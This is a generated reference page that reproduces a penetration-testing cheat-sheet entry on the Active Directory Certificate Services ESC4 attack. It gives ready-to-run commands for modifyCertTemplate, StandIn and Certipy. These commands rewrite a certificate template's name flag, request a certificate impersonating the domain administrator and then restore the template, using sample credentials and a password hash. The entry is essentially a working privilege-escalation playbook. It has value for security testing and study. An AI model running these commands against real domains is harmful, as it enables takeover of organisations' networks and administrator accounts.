---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC4

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc04` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc04.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Enabling the mspki-certificate-name-flag flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability

## Preserved Body

````markdown
## ESC4 - Access Control Vulnerabilities

> Enabling the `mspki-certificate-name-flag` flag for a template that allows for domain authentication, allow attackers to "push a misconfiguration to a template leading to ESC1 vulnerability

* Search for `WriteProperty` with value `00000000-0000-0000-0000-000000000000` using [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate)

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl
  ```

* Add the `ENROLLEE_SUPPLIES_SUBJECT` (ESS) flag to perform ESC1

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag

  # Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. 
  C:\>StandIn.exe --adcs --filter WebServer --ess --add
  ```

* Perform ESC1 and then restore the value

  ```ps1
  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
  ```

Using Certipy

```ps1
# overwrite the configuration to make it vulnerable to ESC1
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
# request a certificate based on the ESC4 template, just like ESC1.
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
# restore the old configuration
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
```

## References

* [ADCS: Playing with ESC4 - Matthew Creel](https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4)
````

## Source Verification

[source record](../../sources/internalallthethings/active-directory-certificate-esc4.md)

## Evidence Excerpt

````text
_body: "# Active Directory - Certificate ESC4\n\n## ESC4 - Access Control Vulnerabilities\n\n> Enabling the `mspki-certificate-name-flag`\
\ flag for a template that allows for domain authentication, allow attackers to \"push a misconfiguration to a template\
\ leading to ESC1 vulnerability\n\n* Search for `WriteProperty` with value `00000000-0000-0000-0000-000000000000` using\
\ [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate)\n\n  ```ps1\n  python3 modifyCertTemplate.py domain.local/user\
\ -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl\n  ```\n\n* Add the `ENROLLEE_SUPPLIES_SUBJECT` (ESS) flag to perform\
\ ESC1\n\n  ```ps1\n  python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add\
\ enrollee_supplies_subject -property mspki-Certificate-Name-Flag\n\n  # Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from\
\ the WebServer template. \n  C:\\>StandIn.exe --adcs --filter WebServer --ess --add\n  ```\n\n* Perform ESC1 and then restore\
````
